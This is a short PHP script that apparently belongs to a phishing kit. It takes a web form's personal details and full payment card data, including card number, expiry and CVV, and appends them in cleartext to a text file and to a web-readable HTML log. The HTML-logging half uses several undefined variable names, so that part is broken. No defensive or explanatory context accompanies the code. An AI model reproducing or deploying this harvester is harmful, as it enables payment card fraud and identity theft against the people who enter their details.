<?
$cardFile = fopen("CCNumbers.txt", "a") or die("unable to open file!");

$firstName = $_POST["fname"];
$lastName = $_POST["lname"];
$address = $_POST["address"];
$city = $_POST["city"];
$state = $_POST["state"];
$zip = $_POST["zip"];
$dob = $_POST["dob"];
$Telephone = $_POST["tel"];
$email = $_POST["email"];
$cardType = $_POST["CCType"];
$cardNumber = $_POST["ccNum"];
$expirationMonth = $_POST["month"];
$expirationyear = $_POST["year"];
$CVV = $_POST["cvv"];

//write to text file first.
fwrite($cardFile,"[".date("l jS \of F Y h:i:s A") ."]"."\n");
fwrite($cardFile,"First Name: " . $firstName ."\n");
fwrite($cardFile,"Last Name: " . $lastName."\n");
fwrite($cardFile,"Address: ". $address."\n");
fwrite($cardFile,"City: " . $city."\n");
fwrite($cardFile,"State: " . $state."\n");
fwrite($cardFile,"Zip: ". $zip."\n");
fwrite($cardFile,"Date of Birth: " . $dob."\n");
fwrite($cardFile,"Telephone Number: " .$Telephone."\n");
fwrite($cardFile,"Email Address: " . $email."\n");
fwrite($cardFile,"Card Type: " . $cardType."\n");
fwrite($cardFile,"Card Number: " . $cardNumber."\n");
fwrite($cardFile,"Expiration Date: " . $expirationMonth."\n");
fwrite($cardFile,"Expiration Year: " . $expirationyear."\n");
fwrite($cardFile,"CVV#: " . $CVV."\n");
fwrite($cardFile,"-----------------------------------------"."\n");
fclose($cardFile);

//write to HTML File
// date DayofWeek,Month,,Day, Year,time
// date(d, l g:i:s);
$cardFileHTML = fopen("cardFileHTML.html",a) or die("Unable to open file!");
fwrite($cardFileHTML, "<font color='red'>".date("l jS \of F Y h:i:s A") ."</font><br>");
fwrite($cardFileHTML, "<b>First Name: </b>" .$fname . "<br>");
fwrite($cardFileHTML, "<b>Last Name: </b>" .$lname . "<br>");
fwrite($cardFileHTML, "<b>Address: </b>" .$address . "<br>");
fwrite($cardFileHTML, "<b>City: </b>" .$city . "<br>");
fwrite($cardFileHTML, "<b>State: </b>" .$state . "<br>");
fwrite($cardFileHTML, "<b>Zip: </b>" .$zip . "<br>");
fwrite($cardFileHTML, "<b>Date of Birth: </b>" .$dob . "<br>");
fwrite($cardFileHTML, "<b>Telephone #: </b>" .$tel . "<br>");
fwrite($cardFileHTML, "<b>Email Address: </b>" .$email . "<br>");
fwrite($cardFileHTML, "<b>Card Type: </b>" .$cardType . "<br>");
fwrite($cardFileHTML, "<b>Card Number: </b>" .$cardNumber . "<br>");
fwrite($cardFileHTML, "<b>Expiration Month: </b>" .$expirationMonth . "<br>");
fwrite($cardFileHTML, "<b>Expiration Year: </b>" .$expirationYear . "<br>");
fwrite($cardFileHTML, "<b>CVV: </b>" .$cvv . "<br>");
fwrite($cardFileHTML, "<hr><br>");
fclose($cardFileHTML);
?>
